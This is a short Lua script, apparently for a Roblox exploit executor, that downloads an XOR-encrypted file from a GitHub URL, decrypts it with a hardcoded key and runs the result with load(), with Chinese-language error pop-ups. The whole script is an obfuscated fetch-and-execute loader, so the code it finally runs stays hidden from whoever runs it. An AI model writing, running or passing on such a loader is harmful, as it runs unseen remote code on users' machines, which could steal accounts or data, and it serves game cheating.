local KEY = "lin-key-cnm-pnmC"
local function xor_decrypt(encrypted_data, key)
    local key_len = #key
    local decrypted = {}
    for i = 1, #encrypted_data do
        local data_byte = string.byte(encrypted_data, i)
        local key_byte = string.byte(key, (i - 1) % key_len + 1)
        local decrypted_byte = bit32.bxor(data_byte, key_byte)
        table.insert(decrypted, string.char(decrypted_byte))
    end
    return table.concat(decrypted)
end
local function show_error(message)
    local player = game:GetService("Players").LocalPlayer
    if not player or not player:FindFirstChild("PlayerGui") then
        warn("无法获取玩家界面容器")
        return
    end
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ErrorPrompt"
    screenGui.Parent = player.PlayerGui
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
    frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    frame.BorderSizePixel = 2
    frame.Parent = screenGui
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.Text = message
    label.TextColor3 = Color3.new(1, 0, 0)
    label.TextScaled = true
    label.Parent = frame
    task.wait(3)
    screenGui:Destroy()
end
local function load_encrypted_from_url(url)
    local success, encrypted_content = pcall(function()
        return game:HttpGet(url, true)
    end)
    if not success then
        show_error("步骤1失败：无法获取网络内容")
        return
    end
    local success, decrypted_code = pcall(function()
        return xor_decrypt(encrypted_content, KEY)
    end)
    if not success then
        show_error("步骤2失败：解密过程出错")
        return
    end
    local func, err = load(decrypted_code)
    if not func then
        show_error("步骤3失败：代码执行错误\n" .. err)
        return
    end
    
    local success = pcall(func)
    if not success then
        show_error("步骤4失败：代码运行时出错")
    end
end
load_encrypted_from_url("https://github.com/xongge/linfly/raw/refs/heads/main/linfly.txt")
